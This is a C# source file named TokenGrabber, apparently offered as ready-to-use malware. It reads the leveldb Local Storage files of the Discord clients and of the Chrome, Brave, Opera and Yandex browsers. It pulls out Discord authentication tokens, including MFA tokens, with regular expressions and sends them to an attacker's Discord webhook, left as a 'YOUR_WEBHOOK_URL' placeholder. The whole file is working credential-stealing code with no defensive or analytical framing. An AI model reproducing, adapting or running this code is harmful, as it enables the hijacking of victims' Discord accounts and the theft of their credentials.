using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace TokenGrabber
{
    class Program
    {
        private static bool tokenIs = false;

        static async Task Main()
        {
            var msg = CToken();

            if (tokenIs && msg.Count > 0)
            {
                try
                {
                    await DiscordWebhook.SendAsync(
                        "YOUR_WEBHOOK_URL",
                        $"Discord Tokens:\n\n{string.Join("\n", msg)}"
                    );
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error sending webhook: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine("No tokens found.");
            }
        }

        public static List<string> CToken()
        {
            List<string> tokenList = new List<string>();
            
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            
            string[] pathsToCheck = new[]
            {
                Path.Combine(roaming, "Discord"),
                Path.Combine(roaming, "discordcanary"),
                Path.Combine(roaming, "discordptb"),
                Path.Combine(roaming, "Opera Software\\Opera Stable"),
                Path.Combine(local, "Google\\Chrome\\User Data\\Default"),
                Path.Combine(local, "BraveSoftware\\Brave-Browser\\User Data\\Default"),
                Path.Combine(local, "Yandex\\YandexBrowser\\User Data\\Default")
            };

            foreach (string path in pathsToCheck)
            {
                if (!Directory.Exists(path))
                    continue;


                string localStoragePath = Path.Combine(path, "Local Storage", "leveldb");
                if (!Directory.Exists(localStoragePath))
                    continue;

            
                foreach (var file in Directory.GetFiles(localStoragePath, "*.ldb"))
                {
                    try
                    {
                        string content = File.ReadAllText(file);
                        
                        
                        foreach (Match match in Regex.Matches(content, @"[\w-]{26}\.[\w-]{6}\.[\w-]{38}"))
                        {
                            string token = match.Value;
                            if (!tokenList.Contains(token)) 
                            {
                                tokenList.Add(token);
                            }
                        }


                        foreach (Match match in Regex.Matches(content, @"mfa\.[\w-]{84}"))
                        {
                            string token = match.Value;
                            if (!tokenList.Contains(token)) 
                            {
                                tokenList.Add(token);
                            }
                        }
                    }
                    catch (IOException ex)
                    {
                        Console.WriteLine($"Error reading file {file}: {ex.Message}");
                    }
                }
            }

            tokenIs = tokenList.Count > 0;
            return tokenList;
        }

        public static class DiscordWebhook
        {
            private static readonly HttpClient Client = new HttpClient();

            public static async Task SendAsync(string url, string message)
            {
                string safeMessage = JsonEncodedText.Encode(message).ToString();
                string payload = "{\"content\":\"" + safeMessage + "\"}";

                using var body = new StringContent(
                    payload,
                    Encoding.UTF8,
                    "application/json"
                );

                using var response = await Client.PostAsync(url, body);
                response.EnsureSuccessStatusCode();
            }
        }
    }
}
